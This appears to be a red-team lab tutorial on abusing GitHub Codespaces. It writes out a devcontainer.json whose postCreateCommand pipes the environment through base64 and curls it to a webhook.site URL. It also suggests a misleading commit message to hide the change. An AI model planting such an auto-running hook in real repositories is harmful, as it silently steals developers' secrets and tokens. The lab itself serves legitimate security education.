# Using GitHub Codespaces to infiltrate without dropping a shell

This lab will simulate how an attacker could use GitHub Codespaces to gain persistent access or exfiltrate data using nothing more than a modified dev container configuration file.

---

## Prerequisites

Before you begin, make sure you have the following:

- **A GitHub account** (with permission to create private repositories).
- **Git installed and configured** on your machine.
  - You can verify by running: `git --version`
- **Internet access** to connect to GitHub and Webhook.site.
- **A browser** to:
  - Access [https://github.com](https://github.com)
  - Use [https://webhook.site](https://webhook.site) to receive the exfiltrated secret.
- **(Optional)** A GitHub personal access token (PAT) if you prefer pushing via HTTPS with authentication.


## Step 1: Create a new GitHub repository

Go to GitHub and create a new public or private repository named something like `codespaces-persistence-demo`.

## Step 2: Add a .devcontainer Directory

Clone the repository locally:

```bash
git clone https://github.com/your-username/codespaces-persistence-demo.git
cd codespaces-persistence-demo
```

Create the required Codespaces configuration structure:

```bash
mkdir -p .devcontainer
```

Create a Dockerfile:

```bash
# .devcontainer/Dockerfile
FROM mcr.microsoft.com/devcontainers/base:ubuntu

RUN apt-get update && apt-get install -y curl
```

## Step 3: Obtain WebHook URL

Go to [https://webhook.site/](https://webhook.site/) and copy the value shown in Your unique URL

## Step 4: Add a malicious devcontainer.json

Inside `.devcontainer/devcontainer.json`, add the following:

```yaml
{
  "name": "codespace-persistence",
  "build": {
    "dockerfile": "Dockerfile"
  },
  "postCreateCommand": "curl -X POST -d \"$(env | base64)\" https://webhook.site/YOUR-UNIQUE-ID"
}
```
Replace `https://webhook.site/your-unique-id` with a unique webhook URL from https://webhook.site. This command encodes the Codespace’s environment variables and sends them to your webhook listener. It’s stealthy, runs silently in the background, and leaves no visual traces unless the developer checks logs or audit trails.

## Step 5: Commit and push

```bash
git add .
git commit -m "Add basic CI workflow"
git push -u origin main
```

## Step 6: Launch a codespace

On the GitHub repo page, click the green “Code” button, and select “Create Codespace on main”.

As the Codespace boots, GitHub builds the container, and your postCreateCommand runs automatically. Within seconds, your webhook will receive a POST request containing the full environment variables of that Codespace, including any secrets, access tokens, or credentials exposed at runtime.
